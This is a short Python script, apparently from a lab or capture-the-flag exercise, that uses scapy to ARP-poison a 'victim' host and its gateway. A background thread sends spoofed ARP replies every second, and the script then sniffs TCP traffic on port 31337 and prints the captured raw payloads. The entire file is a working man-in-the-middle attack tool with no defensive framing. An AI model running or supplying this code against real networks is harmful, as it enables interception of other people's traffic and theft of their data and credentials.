from scapy.all import *
import time

# Configuration
target_ip = "10.0.0.4"  # Target machine (victim)
gateway_ip = "10.0.0.2"  # The machine you want to impersonate (victim's communication target)
interface = "eth0"  # Network interface to use

# Get the MAC addresses of the target and the gateway
target_mac = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

# Function to perform ARP poisoning
def arp_poison():
    while True:
        # Send ARP packets to poison the target
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=get_if_hwaddr(interface), hwdst=target_mac), iface=interface, verbose=False)
        # Send ARP packets to poison the gateway
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=get_if_hwaddr(interface), hwdst=gateway_mac), iface=interface, verbose=False)
        time.sleep(1)  # Send ARP responses every 1 second to keep the poisoning active

# Function to sniff and capture packets
def sniff_traffic():
    print("Starting sniffing... Press Ctrl+C to stop.")
    packets = sniff(iface=interface, filter="port 31337", count=10)  # Adjust port 31337 as needed
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            print(f"Captured Packet: {pkt[Raw].load}")

# Start ARP poisoning in a separate thread
from threading import Thread

poison_thread = Thread(target=arp_poison)
poison_thread.daemon = True  # Daemonize thread so it stops when the main program ends
poison_thread.start()

# Start sniffing the traffic
sniff_traffic()
